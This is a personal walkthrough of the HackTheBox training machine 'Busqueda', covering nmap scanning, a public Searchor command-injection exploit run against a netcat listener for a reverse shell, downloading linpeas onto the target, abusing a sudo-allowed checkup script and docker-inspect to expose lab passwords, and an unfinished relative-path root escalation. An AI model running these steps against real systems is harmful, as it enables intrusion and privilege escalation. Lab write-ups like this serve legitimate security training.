---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Busqueda?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
---

---
# Information / Description

![800](../../0.%20Assets/Busqueda-1788730613603.webp)

---

# Walkthrough

We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail

```
nmap -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
```

This will result in a file with the result of the `nmap`

```
┌─[bl1nk㉿kali]─[~/engagements/busqueda/nmap]─[󰦝 10.10.15.150]─[ 10.129.228.217]
└─❯ cat results.txt -l java

   1 │ # Nmap 7.99 scan initiated Sun Sep  6 23:48:42 2026 as: /usr/lib/nmap/nmap --privileged -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v 10.129.228.217
   2 │ Nmap scan report for 10.129.228.217
   3 │ Host is up (0.026s latency).
   4 │
   5 │ PORT   STATE SERVICE VERSION
   6 │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   7 │ | ssh-hostkey:
   8 │ |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
   9 │ |_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
  10 │ 80/tcp open  http    Apache httpd 2.4.52
  11 │ |_http-title: Did not follow redirect to http://searcher.htb/
  12 │ |_http-server-header: Apache/2.4.52 (Ubuntu)
  13 │ | http-methods:
  14 │ |_  Supported Methods: GET HEAD POST OPTIONS
  15 │ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  16 │
  17 │ Read data files from: /usr/share/nmap
  18 │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  19 │ # Nmap done at Sun Sep  6 23:48:50 2026 -- 1 IP address (1 host up) scanned in 7.72 seconds

```

There is not much to see here, so let's enter the webserver and see what we can find

It looks like it is not finding the website, so let's add it to our `/etc/hosts` to see if the resolution in name helps

![](../../0.%20Assets/Busqueda-1788731537507.webp)

Luckily we know the name of the server because of the title (nmap snitched hahaha)


Once we enter the site we can see a searcher for engines and some version disclosure

![](../../0.%20Assets/Busqueda-1788732635230.webp)

So i found this [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)

So I read the documentation and apparently I only need to start a `netcat` listener on port `9001` which is the default by the script and run the script

```
rlwrap nc -nlvp 9001
```

- I encapsulated the `netcat listener` with `rlwrap` to stabilize the shell

and then I run the script as the documentation explained.

```
./exploit.sh searcher.htb 10.10.15.150 9001
```

![](../../0.%20Assets/Busqueda-1788732986819.webp)

And in the `home` directory we can find the user flag

![](../../0.%20Assets/Busqueda-1788733022791.webp)

With my custom command `serve` I started a python webserver to retrieve `linpeas.sh` and `linux-exploit-suggester.sh` from the target

Then from the target:

```
wget http://10.10.15.150/linpeas.sh
wget http://10.10.15.150/linux-exploit-suggester.sh
```

For the privilege escalation, I looked everywhere and didn't find much until I came back to the path we where dropped in and saw the `.git` directory

![](../../0.%20Assets/Busqueda-1788735563837.webp)

And inside found a `config` file

![](../../0.%20Assets/Busqueda-1788735641485.webp)

We can see `gitea.searcher.htb` so we can add that to our `/etc/hosts` file for name resolution and with a bit of luck find more information there

And look at that

![|602x473](../../0.%20Assets/Busqueda-1788736111505.webp)

Seems like we need to sign in so let's look for some credentials

Inside of the `logs` directory in `.git` we can find what looks to be a username

![](../../0.%20Assets/Busqueda-1788736349104.webp)

So we will remember `administrator`

Okay, I was doing some fuzzing with `gobuster` and apparently we can find the user `administrator` directly as  a page

![544](../../0.%20Assets/Busqueda-1788736570669.webp)![|892x389](../../0.%20Assets/Busqueda-1788736702944.webp)

There wasn't anything interesting

Moving around the page I also found another user called `Cody`

![](../../0.%20Assets/Busqueda-1788736656512.webp)

And i realized we had the credentials for cody all this time like a dummy (ive spent more than an hour looking for them hahaha)

![](../../0.%20Assets/Busqueda-1788737934074.webp)

Inside there is a hidden repository

![](../../0.%20Assets/Busqueda-1788738008060.webp)

I looked through it and didn't find anything crazy

so now that we have a credential let's try again from the machine

first import a proper shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

now let's check for sudo permissions

```
sudo -l
```

```
svc@busqueda:/var/www/app$ sudo -l                                                                                                       
sudo -l                                                                                                                                  
[sudo] password for svc: jh1usoih2bkjaspwe92                                                                                             
  
Matching Defaults entries for svc on busqueda:                                                                                           
    env_reset, mail_badpass,                                                                                                             
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                                            
    use_pty                                                                                                                              

User svc may run the following commands on busqueda:                                                                                     
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

So we can see a script running as python, let's read what it does

we can't `cat` into it so let's try running it

```
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *                                                        
<o /usr/bin/python3 /opt/scripts/system-checkup.py *                                                                                     
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)                                                                             

     docker-ps     : List running docker containers                                                                                      
     docker-inspect : Inpect a certain docker container                                                                                  
     full-checkup  : Run a full system checkup                                                                                           

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![](../../0.%20Assets/Busqueda-1788738520389.webp)

And wow, okay we see some docker containers, looks like a `mysql` and the `gitea` itself

It seems interesting to me that the ssh port is mapped, let's see if we can go inside

![](../../0.%20Assets/Busqueda-1788738936000.webp)

Okay so I tried the last command `"docker-inspect"`

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e
```

(I am not going to lie, I got to this point but this last command I had to look up)


![](../../0.%20Assets/Busqueda-1788739131102.webp)


| database | user  | password          |
| -------- | ----- | ----------------- |
| gitea    | gitea | yuiu1hoiu4i5ho1uh |

Cool, let's try connecting to the database and see what we can find

I came back and logged in as `Administrator`

![](../../0.%20Assets/Busqueda-1788740410655.webp)

And the found the source code for the `checkup` script

`Fullcheckup` wasn't working for me before let's see now that we found the source code



![](../../0.%20Assets/Busqueda-1788741074009.webp)

The script revealed a key vulnerability: when executing the `full-checkup` argument, it runs `./full-checkup.sh` using a relative path instead of an absolute path.


```
find / -name full-checkup.sh 2>/dev/null                                                                                                 
/opt/scripts/full-checkup.sh
```

![](../../0.%20Assets/Busqueda-1788741472131.webp)

And from there it works

So this tells us that the script reads from where currently are and runs a script called `full-checkup` and runs it as `root` so why don't we move to a path where we can write (like `/tmp`) and write our own script that will be executed by root.

So i created a script that sends me a reverse shell, and because root is the one which will be sending me the reverse shell then i will have root permissions

![](../../0.%20Assets/Busqueda-1788743147056.webp)


For the love of god i couldnt make it work so I don't know, I checked walkthroughs and everything (ive been doing the machine for 3,5 hours {and it is supposed to be easy}) so I will leave it at here for now and maybe come back at it another time 

![](../../0.%20Assets/Busqueda-1788743296038.webp)